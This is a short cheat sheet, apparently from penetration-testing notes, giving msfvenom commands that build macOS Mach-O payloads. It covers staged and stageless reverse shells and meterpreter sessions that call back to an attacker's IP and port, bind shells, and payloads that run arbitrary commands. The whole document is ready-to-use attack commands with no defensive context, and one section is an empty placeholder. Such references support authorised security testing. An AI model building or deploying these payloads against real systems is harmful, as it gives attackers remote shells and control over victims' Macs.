# Macho Execution

## 01 - Generate Payloads

### 1.1 - Reverse Shells

Staged x86-64 (64-bit) reverse shell.

```
$ msfvenom -p osx/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f macho -o payload-x64
```

Stageless x86-64 (64-bit) reverse shell.

```
$ msfvenom -p osx/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f macho -o shell_x64
```

Stageless x86_64 (64-bit) `meterpreter` reverse shell.

```
$ msfvenom -p osx/x64/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f macho -o payload-x64

$ msfvenom -p osx/x64/meterpreter_reverse_https handlersslcert=<file.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f macho -o payload-x64
```

Stageless x86 (32-bit) reverse shell.

```
$ msfvenom -p osx/x86/shell_reverse_tcp lhost=<IP> lport=<PORT> -f macho -o shell_x86
```

### 1.2 - Bind Shells

Stageless x86-64 (64-bit) bind shell.

```
$ msfvenom -p osx/x64/shell_bind_tcp lport=<PORT> -f macho -o shell-x86-64
```

Staged x86-64 (64-bit) `meterpreter` bind shell.

```
$ msfvenom -p osx/x64/meterpreter/bind_tcp lport=<PORT> -f macho -o payload-x64
```

Stageless x86 (32-bit) bind shell.

```
$ msfvenom -p osx/x86/shell_bind_tcp lport=<PORT> -f macho -o shell-x86
```

TODO: Fill the missing info related stageless mac osx meterpreter bind shells

Staged x86 (32-bit) `meterpreter` bind shell.

```

```

### 1.3 - Executable Binary Payloads

#### 1.3.1 - Text-To-Speech OSX Exec Payload

```
$ msfvenom -p osx/x64/say text=<message> -f macho -o payload-x64
```

#### 1.3.2 - Execute OSX Exec Payload

```
$ msfvenom -p osx/x86/exec cmd="<commands>" -f macho -o payload-x86

$ msfvenom -p osx/x64/exec cmd="<commands>" -f macho -o payload-x64
```